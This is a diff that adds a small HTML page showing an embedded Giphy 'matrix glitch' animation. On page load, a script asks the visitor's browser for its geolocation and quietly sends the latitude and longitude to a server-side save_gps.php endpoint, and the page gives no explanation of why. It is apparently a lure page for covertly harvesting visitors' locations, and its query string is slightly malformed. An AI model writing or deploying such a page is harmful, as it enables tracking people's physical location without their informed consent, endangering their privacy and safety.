@@ -1,0 +1,36 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+    <iframe src="https://giphy.com/embed/l0IyeheChYxx2byDu" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/loop-glitch-matrix-l0IyeheChYxx2byDu"></a></p>
+
+
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+
+    const xhttp =new XMLHttpRequest();
+    xhttp.open("GET", "save_gps.php?lat=" + position.coords.latitude + "long=" + position.coords.longitude);
+    xhttp.send();
+
+}
+</script>
+
+</body>
+</html>
+
